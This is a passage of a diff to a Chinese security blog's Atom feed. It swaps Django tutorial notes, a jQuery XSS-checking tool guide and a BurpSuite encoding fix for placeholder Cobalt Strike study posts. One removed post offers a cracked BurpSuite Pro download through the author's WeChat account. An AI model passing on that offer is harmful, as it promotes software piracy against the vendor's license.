class="string">'book'</span>]</span><br></pre></td></tr></table></figure><p><code>admin.py</code>完成的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># BookManager/Book/admin.py</span></span><br><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> Book.models <span class="keyword">import</span> BookInfo, PeopleInfo</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PeopleInfoAdmin</span><span class="params">(admin.ModelAdmin)</span>:</span></span><br><span class="line">list_display = [<span class="string">'id'</span>, <span class="string">'name'</span>, <span class="string">'gender'</span>, <span class="string">'book'</span>]</span><br><span class="line"></span><br><span class="line">admin.site.register(BookInfo)</span><br><span class="line">admin.site.register(PeopleInfo, PeopleInfoAdmin)<span class="comment">#注意此处添加PeopleInfoAdmin以注册</span></span><br></pre></td></tr></table></figure><p>再来刷新一下页面，就舒服很多了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/8django_note.png" alt></p><blockquote><p>参考链接：</p><p><a href="https://youtu.be/BXyGr9JQVcc" target="_blank" rel="noopener">https://youtu.be/BXyGr9JQVcc</a></p><p><a href="https://www.cnblogs.com/Demon-Mx/p/8385318.html" target="_blank" rel="noopener">https://www.cnblogs.com/Demon-Mx/p/8385318.html</a></p><p><a href="https://blog.csdn.net/qq_35965090/article/details/81663941" target="_blank" rel="noopener">https://blog.csdn.net/qq_35965090/article/details/81663941</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
+    <content type="html"><![CDATA[<p>此文章待更新……</p><a id="more"></a><blockquote><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV16b411i7n5" target="_blank" rel="noopener">https://www.bilibili.com/video/BV16b411i7n5</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
     
     <summary type="html">
     
-      &lt;h1 id=&quot;0x00-模型&quot;&gt;&lt;a href=&quot;#0x00-模型&quot; class=&quot;headerlink&quot; title=&quot;0x00 模型&quot;&gt;&lt;/a&gt;0x00 模型&lt;/h1&gt;&lt;ul&gt;
-&lt;li&gt;&lt;p&gt;当前项目的开发, 都是数据驱动的。&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;使用Django进行数据库开发的提示 ：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;MVT&lt;/code&gt;设计模式中的&lt;code&gt;Model&lt;/code&gt;, 专门负责和数据库交互.对应&lt;code&gt;(models.py)&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;由于&lt;code&gt;Model&lt;/code&gt;中内嵌了&lt;code&gt;ORM框架&lt;/code&gt;, 所以不需要直接面向数据库编程.&lt;/li&gt;
-&lt;li&gt;而是定义模型类, 通过&lt;code&gt;模型类和对象&lt;/code&gt;完成数据库表的&lt;code&gt;增删改查&lt;/code&gt;.&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;ORM框架&lt;/code&gt;就是把数据库表的行与相应的对象建立关联, 互相转换.使得数据库的操作面向对象.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;使用Django进行数据库开发的步骤 ：&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;定义模型类&lt;/li&gt;
-&lt;li&gt;模型迁移&lt;/li&gt;
-&lt;li&gt;操作数据库&lt;/li&gt;
-&lt;/ol&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
+      &lt;p&gt;此文章待更新……&lt;/p&gt;
     
     </summary>
     
       <category term="学习笔记" scheme="https://www.teamssix.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     
     
-      <category term="Python" scheme="https://www.teamssix.com/tags/Python/"/>
-    
-      <category term="Django" scheme="https://www.teamssix.com/tags/Django/"/>
+      <category term="Cobalt Strike" scheme="https://www.teamssix.com/tags/Cobalt-Strike/"/>
     
       <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     
   </entry>
   
   <entry>
-    <title>【Django 学习笔记】1、基础概念和MVT架构</title>
-    <link href="https://www.teamssix.com/year/200229-220746.html"/>
-    <id>https://www.teamssix.com/year/200229-220746.html</id>
-    <published>2020-02-29T14:07:46.000Z</published>
-    <updated>2020-02-29T14:31:14.119Z</updated>
+    <title>【CS学习笔记】24、C2lints实例演示</title>
+    <link href="https://www.teamssix.com/year/200419-150712.html"/>
+    <id>https://www.teamssix.com/year/200419-150712.html</id>
+    <published>2020-04-19T07:07:12.000Z</published>
+    <updated>2020-04-19T07:21:54.059Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="0x00-Django-简介"><a href="#0x00-Django-简介" class="headerlink" title="0x00 Django 简介"></a>0x00 Django 简介</h1><ul><li>Django是Python写的开源Web开发框架，主要目的是做一个简便、快速的开发数据库驱动的网站</li><li>Django遵循MVC设计模式，在Django中有个专有名词，叫做MVT<ul><li>设计模式就是前辈们在开发过程中总结出来的经验和套路</li><li>MVC是一种设计模式，在这种设计模式下衍生出了MVT</li></ul></li><li>Django中文说明文档：<a href="https://yiyibooks.cn/xx/django_182/index.html" target="_blank" rel="noopener">https://yiyibooks.cn/xx/django_182/index.html</a></li></ul><a id="more"></a><h1 id="0x01-MVC-简介"><a href="#0x01-MVC-简介" class="headerlink" title="0x01 MVC 简介"></a>0x01 MVC 简介</h1><ul><li><p>全拼：<code>Model View Controller</code></p></li><li><p>MVC 核心思想：<strong>解耦</strong></p><ul><li>让不同的模块之间降低耦合, 增强代码的可扩展性和可移植性, 实现更好的向后续版本的兼容</li><li>开发原则 : <strong>高内聚, 低耦合</strong></li></ul></li><li><p>MVC 解析</p><ul><li><p><code>M</code>全拼为<code>Model</code>, 主要封装对数据库层的访问, 内嵌ORM框架, 实现面向对象的编程来操作数据库.</p></li><li><p><code>V</code>全拼为<code>View</code>, 用于封装结果, 内嵌了模板引擎, 实现动态展示数据.</p></li><li><p><code>C</code>全拼为<code>Controller</code>, 用于接收GET或POST请求, 处理业务逻辑, 与Model和View交互, 返回结果.</p></li></ul></li></ul><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/1django_note.png" alt></p><h1 id="0x02-MVT-简介"><a href="#0x02-MVT-简介" class="headerlink" title="0x02 MVT 简介"></a>0x02 MVT 简介</h1><ul><li>MVT全拼为<code>Model-View-Template</code></li><li>MVT核心思想： <strong>解耦</strong>（按照模块间的职能进行划分，然后做解耦）</li><li>MVT解析<ul><li><code>M (模型)</code>全拼为<code>Model</code>, 与MVC中的M功能相同, 负责数据处理, 内嵌了ORM框架.</li><li><code>V (视图)</code>全拼为<code>View</code>, 与MVC中的C功能相同, 接收HttpRequest, 业务处理，返回HttpResponse.</li><li><code>T (模板)</code>全拼为<code>Template</code>, 与MVC中的V功能相同, 负责封装构造要返回的html, 内嵌了模板引擎.</li></ul></li><li>MVT 和 MVC 差异就在于黑箭头标识出来的部分.</li></ul><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/2django_note.png" alt></p><p><strong>学习 Django, 重点就是研究 <code>Model-View-Template</code> 三个模块间如何协同工作及各自模块的代码如何编写。</strong></p><h1 id="0x03-Django安装及项目创建"><a href="#0x03-Django安装及项目创建" class="headerlink" title="0x03 Django安装及项目创建"></a>0x03 Django安装及项目创建</h1><h2 id="1、安装Django"><a href="#1、安装Django" class="headerlink" title="1、安装Django"></a>1、安装Django</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install django</span><br></pre></td></tr></table></figure><h2 id="2、创建Django项目"><a href="#2、创建Django项目" class="headerlink" title="2、创建Django项目"></a>2、创建Django项目</h2><p>以书籍管理系统为例，这里创建的项目名为”book”</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&gt; django-admin startproject BookManager <span class="comment">#创建项目</span></span><br><span class="line">&gt; <span class="built_in">cd</span> BookManager</span><br><span class="line">BookManager/ &gt; python3 manage.py startapp Book <span class="comment">#创建应用</span></span><br><span class="line">BookManager/ &gt; tree</span><br><span class="line">.</span><br><span class="line">├── Book</span><br><span class="line">│   ├── __init__.py<span class="comment">#表示文件Book可以被当作包使用</span></span><br><span class="line">│   ├── admin.py<span class="comment">#后台的站点管理注册文件</span></span><br><span class="line">│   ├── apps.py</span><br><span class="line">│   ├── migrations<span class="comment">#做模型迁移</span></span><br><span class="line">│   │   └── __init__.py</span><br><span class="line">│   ├── models.py<span class="comment">#MVT中的M</span></span><br><span class="line">│   ├── tests.py<span class="comment">#做测试用</span></span><br><span class="line">│   └── views.py<span class="comment">#MVT中的V</span></span><br><span class="line">├── BookManager</span><br><span class="line">│   ├── __init__.py<span class="comment">#表示文件BookManager可以被当作包使用</span></span><br><span class="line">│   ├── __pycache__</span><br><span class="line">│   │   ├── __init__.cpython-37.pyc</span><br><span class="line">│   │   └── settings.cpython-37.pyc</span><br><span class="line">│   ├── asgi.py</span><br><span class="line">│   ├── settings.py<span class="comment">#项目的整体配置文件</span></span><br><span class="line">│   ├── urls.py<span class="comment">#项目的URL配置文件</span></span><br><span class="line">│   └── wsgi.py<span class="comment">#项目与WSGI兼容的Web服务器入口</span></span><br><span class="line">└── manage.py<span class="comment">#项目运行的入口, 指定配置文件路径</span></span><br><span class="line"></span><br><span class="line">4 directories, 15 files</span><br></pre></td></tr></table></figure><p>创建之后，使用PyChram打开，在<code>setting.py</code>的第39行下方添加<code>&#39;Book&#39;,</code>即将INSTALLED_APPS修改成如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">INSTALLED_APPS = [</span><br><span class="line">    <span class="string">'django.contrib.admin'</span>,</span><br><span class="line">    <span class="string">'django.contrib.auth'</span>,</span><br><span class="line">    <span class="string">'django.contrib.contenttypes'</span>,</span><br><span class="line">    <span class="string">'django.contrib.sessions'</span>,</span><br><span class="line">    <span class="string">'django.contrib.messages'</span>,</span><br><span class="line">    <span class="string">'django.contrib.staticfiles'</span>,</span><br><span class="line">    <span class="string">'Book'</span>,<span class="comment">#添加此行以安装应用</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="3、运行项目"><a href="#3、运行项目" class="headerlink" title="3、运行项目"></a>3、运行项目</h2><p>在项目目录下，执行<code>python3 manage.py runserver</code>即可运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 manage.py runserver</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">BookManager/ &gt; python3 manage.py runserver</span><br><span class="line">Watching <span class="keyword">for</span> file changes with StatReloader</span><br><span class="line">Performing system checks...</span><br><span class="line">System check identified no issues (0 silenced).</span><br><span class="line">You have 17 unapplied migration(s). Your project may not work properly until you apply the migrations <span class="keyword">for</span> app(s): admin, auth, contenttypes, sessions.</span><br><span class="line">Run <span class="string">'python manage.py migrate'</span> to apply them.</span><br><span class="line">February 28, 2020 - 19:08:25</span><br><span class="line">Django version 3.0.3, using settings <span class="string">'BookManager.settings'</span></span><br><span class="line">Starting development server at http://127.0.0.1:8000/</span><br><span class="line">Quit the server with CTRL-BREAK.</span><br></pre></td></tr></table></figure><p>此时，浏览器访问<code>http://127.0.0.1:8000/</code>，出现以下界面，说明项目已经成功创建了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/3django_note.png" alt></p><blockquote><p>参考链接：</p><p><a href="https://youtu.be/BXyGr9JQVcc" target="_blank" rel="noopener">https://youtu.be/BXyGr9JQVcc</a></p><p><a href="https://www.cnblogs.com/Demon-Mx/p/8385318.html" target="_blank" rel="noopener">https://www.cnblogs.com/Demon-Mx/p/8385318.html</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
+    <content type="html"><![CDATA[<p>此文章待更新……</p><a id="more"></a><blockquote><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV16b411i7n5" target="_blank" rel="noopener">https://www.bilibili.com/video/BV16b411i7n5</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
     
     <summary type="html">
     
-      &lt;h1 id=&quot;0x00-Django-简介&quot;&gt;&lt;a href=&quot;#0x00-Django-简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 Django 简介&quot;&gt;&lt;/a&gt;0x00 Django 简介&lt;/h1&gt;&lt;ul&gt;
-&lt;li&gt;Django是Python写的开源Web开发框架，主要目的是做一个简便、快速的开发数据库驱动的网站&lt;/li&gt;
-&lt;li&gt;Django遵循MVC设计模式，在Django中有个专有名词，叫做MVT&lt;ul&gt;
-&lt;li&gt;设计模式就是前辈们在开发过程中总结出来的经验和套路&lt;/li&gt;
-&lt;li&gt;MVC是一种设计模式，在这种设计模式下衍生出了MVT&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;Django中文说明文档：&lt;a href=&quot;https://yiyibooks.cn/xx/django_182/index.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://yiyibooks.cn/xx/django_182/index.html&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
+      &lt;p&gt;此文章待更新……&lt;/p&gt;
     
     </summary>
     
       <category term="学习笔记" scheme="https://www.teamssix.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     
     
-      <category term="Python" scheme="https://www.teamssix.com/tags/Python/"/>
-    
-      <category term="Django" scheme="https://www.teamssix.com/tags/Django/"/>
+      <category term="Cobalt Strike" scheme="https://www.teamssix.com/tags/Cobalt-Strike/"/>
     
       <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     
   </entry>
   
   <entry>
-    <title>【工具分享】分享一个jQuery多版本XSS漏洞检测工具</title>
-    <link href="https://www.teamssix.com/year/200223-231648.html"/>
-    <id>https://www.teamssix.com/year/200223-231648.html</id>
-    <published>2020-02-23T15:16:48.000Z</published>
-    <updated>2020-02-23T15:43:15.330Z</updated>
+    <title>【CS学习笔记】23、malleable命令</title>
+    <link href="https://www.teamssix.com/year/200419-150704.html"/>
+    <id>https://www.teamssix.com/year/200419-150704.html</id>
+    <published>2020-04-19T07:07:04.000Z</published>
+    <updated>2020-04-19T07:21:50.227Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近在搞一个 jQuery v2.1.4 DOM-XSS 漏洞的复现，在网上找了很多Payload都不能用，大多数Payload都只适用于 jQuery v1.x 版本的。</p><p>后来看到有个文章说需要Safari浏览器，于是又废了半天劲装了个黑苹果（当时不知道原来Safari浏览器还有Windows版），用Safari浏览器一番折腾依旧没有复现，直到后来在GitHub上找到了这个检测工具，分享出来，避免踩坑。</p><a id="more"></a><h1 id="0x01-工具使用"><a href="#0x01-工具使用" class="headerlink" title="0x01 工具使用"></a>0x01 工具使用</h1><blockquote><p>下载地址：<a href="https://github.com/mahp/jQuery-with-XSS" target="_blank" rel="noopener">https://github.com/mahp/jQuery-with-XSS</a></p></blockquote><p>1、下载之后，解压，使用编辑器打开，修改第9行代码，将代码中 src 后的链接修改为自己要验证的js地址链接。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;http://yourjquerylink/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>2、保存之后，使用浏览器打开，然后可以看到3个Demo.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bug-9521</span><br><span class="line">bug-11290</span><br><span class="line">bug-11974</span><br></pre></td></tr></table></figure><p>3、可以依次点击这三个Demo，看看哪个会弹窗，我这里是 jQuery v2.1.4 的版本，在点击 bug-11974 发生了弹窗，说明此版本的漏洞被验证成功了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/1Snipaste_2020-02-23_23-05-36.png" alt></p><p>4、也可以点击页面中的 test version，来判断自己版本的  jQuery 版本存在的 bug 编号，例如我这里的  jQuery v2.1.4 版本就对应着 bug-2432和bug-11974。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/2Snipaste_2020-02-23_23-09-03.png" alt></p><p>5、知道 bug 编号之后，再来到 test.html 页面点击对应的 bug编号即可。</p><h1 id="0x02-小结"><a href="#0x02-小结" class="headerlink" title="0x02 小结"></a>0x02 小结</h1><p>以上工具的使用方法是自己慢慢摸索出来的，如有不对的地方欢迎留言批评指正。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;最近在搞一个 jQuery v2.1.4 DOM-XSS 漏洞的复现，在网上找了很多Payload都不能用，大多数Payload都只适用于 jQuery v1.x 版本的。&lt;/p&gt;
-&lt;p&gt;后来看到有个文章说需要Safari浏览器，于是又废了半天劲装了个黑苹果（当时不知道原来Safari浏览器还有Windows版），用Safari浏览器一番折腾依旧没有复现，直到后来在GitHub上找到了这个检测工具，分享出来，避免踩坑。&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="工具分享" scheme="https://www.teamssix.com/categories/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/"/>
-    
-    
-      <category term="工具分享" scheme="https://www.teamssix.com/tags/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/"/>
-    
-      <category term="XSS" scheme="https://www.teamssix.com/tags/XSS/"/>
-    
-      <category term="jQuery" scheme="https://www.teamssix.com/tags/jQuery/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【经验总结】解决 BurpSuite Pro v2020.1 版本中文乱码问题</title>
-    <link href="https://www.teamssix.com/year/200217-134445.html"/>
-    <id>https://www.teamssix.com/year/200217-134445.html</id>
-    <published>2020-02-17T05:44:45.000Z</published>
-    <updated>2020-02-20T11:47:45.641Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>之前在我的公众号分享了 BurpSuite Pro v2020.1 版本，但是在使用过程中发现总是会有中文乱码的情况出现，后来使用 Lucida 字体，乱码的情况得到了缓解，但是有些网页依旧会出现乱码的情况，直到后来才意识到问题其实不在于字体的选择。</p><a id="more"></a><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/1Snipaste_2020-02-17_13-34-32.png" alt></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/2Snipaste_2020-02-17_13-37-02.png" alt></p><h1 id="0x01-解决办法"><a href="#0x01-解决办法" class="headerlink" title="0x01 解决办法"></a>0x01 解决办法</h1><p>来到 User Options –&gt; Display –&gt; Character Sets，在第四个选项中选择 UTF-8，中文乱码的问题就可以得到解决，这个时候不管我字体选择的是哪一个，中文都是显示正常的。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/3Snipaste_2020-02-17_13-38-35.png" alt></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/4Snipaste_2020-02-17_13-39-09.png" alt></p><h1 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h1><p>在网上找了很多解决办法，但是大部分文章都是说更改中文字体就能解决，但是我这个版本没有中文字体，所以那些文章里的办法都不能用，最后才意识到通过修改编码就能解决。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
+    <content type="html"><![CDATA[<p>此文章待更新……</p><a id="more"></a><blockquote><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV16b411i7n5" target="_blank" rel="noopener">https://www.bilibili.com/video/BV16b411i7n5</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
     
     <summary type="html">
     
-      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;之前在我的公众号分享了 BurpSuite Pro v2020.1 版本，但是在使用过程中发现总是会有中文乱码的情况出现，后来使用 Lucida 字体，乱码的情况得到了缓解，但是有些网页依旧会出现乱码的情况，直到后来才意识到问题其实不在于字体的选择。&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="经验总结" scheme="https://www.teamssix.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
-    
-    
-      <category term="BurpSuite" scheme="https://www.teamssix.com/tags/BurpSuite/"/>
-    
-      <category term="软件" scheme="https://www.teamssix.com/tags/%E8%BD%AF%E4%BB%B6/"/>
-    
-      <category term="经验总结" scheme="https://www.teamssix.com/tags/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【工具分享】BurpSuite Pro v2020.1 无后门专业破解版</title>
-    <link href="https://www.teamssix.com/year/200211-135752.html"/>
-    <id>https://www.teamssix.com/year/200211-135752.html</id>
-    <published>2020-02-11T05:57:52.000Z</published>
-    <updated>2020-02-11T06:01:39.304Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>工欲善其身，必先利其器，吃饭的家伙终于更新了，这次改动还蛮大的，尤其是加入了黑暗模式。</p><p>至于工具的使用及破解方法相信你既然能看到这篇文章，那就不用我过多赘述了 [手动狗头]。</p><a id="more"></a><h1 id="新功能"><a href="#新功能" class="headerlink" title="新功能"></a>新功能</h1><p>1、HTTP消息编辑器下JavaScript、JSON、CSS的语法高亮颜色</p><p>2、添加了行号，代码折叠功能</p><p>3、漏洞扫描检测、规则有巨大提升</p><p>4、增加黑暗主题</p><p>5、新增特殊功能、性能改进…</p><h1 id="获取方式"><a href="#获取方式" class="headerlink" title="获取方式"></a>获取方式</h1><p>在我的公众号（TeamsSix）回复 “ Burp “ 即可获取下载地址。</p><h1 id="新版效果"><a href="#新版效果" class="headerlink" title="新版效果"></a>新版效果</h1><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/burp20201_1.png" alt></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/burp20201_3.png" alt></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/burp20201_2.png" alt></p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;工欲善其身，必先利其器，吃饭的家伙终于更新了，这次改动还蛮大的，尤其是加入了黑暗模式。&lt;/p&gt;
-&lt;p&gt;至于工具的使用及破解方法相信你既然能看到这篇文章，那就不用我过多赘述了 [手动狗头]。&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="工具分享" scheme="https://www.teamssix.com/categories/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/"/>
-    
-    
-      <category term="BurpSuite" scheme="https://www.teamssix.com/tags/BurpSuite/"/>
-    
-      <category term="工具分享" scheme="https://www.teamssix.com/tags/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/"/>
-    
-      <category term="软件" scheme="https://www.teamssix.com/tags/%E8%BD%AF%E4%BB%B6/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【摘要】漏洞组合拳之XSS+CSRF记录</title>
-    <link href="https://www.teamssix.com/year/200206-202959.html"/>
-    <id>https://www.teamssix.com/year/200206-202959.html</id>
-    <published>2020-02-06T12:29:59.000Z</published>
-    <updated>2020-02-06T12:43:20.142Z</updated>
-    
-    <content type="html"><![CDATA[<p>前几天，我在FreeBuf发布了一篇文章《漏洞组合拳之XSS+CSRF记录》，因为版权原因，无法在​这里发布。</p><p>文章里介绍了两种常见的组合拳方法，感兴趣的可以点击下方链接进行查看。</p><p>文章链接：<a href="https://www.freebuf.com/vuls/225096.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/225096.html</a></p><a id="more"></a><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix<br>本文原文地址：<a href="https://www.teamssix.com/year/200206-202959.html">https://www.teamssix.com/year/200206-202959.html</a></p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;前几天，我在FreeBuf发布了一篇文章《漏洞组合拳之XSS+CSRF记录》，因为版权原因，无法在​这里发布。&lt;/p&gt;
-&lt;p&gt;文章里介绍了两种常见的组合拳方法，感兴趣的可以点击下方链接进行查看。&lt;/p&gt;
-&lt;p&gt;文章链接：&lt;a href=&quot;https://www.freebuf.com/vuls/225096.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.freebuf.com/vuls/225096.html&lt;/a&gt;&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="摘要" scheme="https://www.teamssix.com/categories/%E6%91%98%E8%A6%81/"/>
-    
-    
-      <category term="XSS" scheme="https://www.teamssix.com/tags/XSS/"/>
-    
-      <category term="CSRF" scheme="https://www.teamssix.com/tags/CSRF/"/>
-    
-      <category term="组合拳" scheme="https://www.teamssix.com/tags/%E7%BB%84%E5%90%88%E6%8B%B3/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【经验总结】Python3 Requests 模块请求内容包含中文报错的解决办法</title>
-    <link href="https://www.teamssix.com/year/200206-202951.html"/>
-    <id>https://www.teamssix.com/year/200206-202951.html</id>
-    <published>2020-02-06T12:29:51.000Z</published>
-    <updated>2020-02-06T12:44:36.542Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近在写一个爬虫代码，里面需要使用 get 传参中文，但是如果直接使用中文而不对其编码的话，程序将会报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UnicodeEncodeError: &apos;latin-1&apos; codec can&apos;t encode characters in position 38-39: ordinal not in range(256)</span><br></pre></td></tr></table></figure><a id="more"></a><h1 id="0x01-网上的一些解决办法"><a href="#0x01-网上的一些解决办法" class="headerlink" title="0x01 网上的一些解决办法"></a>0x01 网上的一些解决办法</h1><p>参考网上的解决办法，比如下面的几种办法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、在中文后加上&quot;.encode(&apos;GBK&apos;)&quot;</span><br><span class="line">2、在文件头部加上&quot;＃coding = utf-8&quot;</span><br><span 